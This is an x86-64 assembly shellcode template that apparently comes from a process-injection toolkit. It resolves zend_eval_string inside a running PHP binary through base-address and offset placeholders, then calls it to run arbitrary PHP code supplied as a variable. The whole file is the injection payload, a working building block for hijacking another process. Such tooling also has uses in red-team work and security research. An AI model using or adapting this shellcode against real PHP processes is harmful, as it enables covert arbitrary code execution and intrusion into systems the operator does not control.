	// BEGIN: call zend_eval_string("arbitrary PHP code here")
	push rbx
	lea rdx, php_name[rip]	# arbitrary name
	mov rsi, 0				# return value pointer
	lea rdi, php_code[rip]	# PHP code
	mov rbx, [BASEADDRESS:.+/php[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:zend_eval_string:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call zend_eval_string("arbitrary PHP code here")

SHELLCODE_SECTION_DELIMITER
	
php_code:
	.ascii "[VARIABLE:phpcode:VARIABLE]\0"

php_name:
	.ascii "[VARIABLE:phpname:VARIABLE]\0"

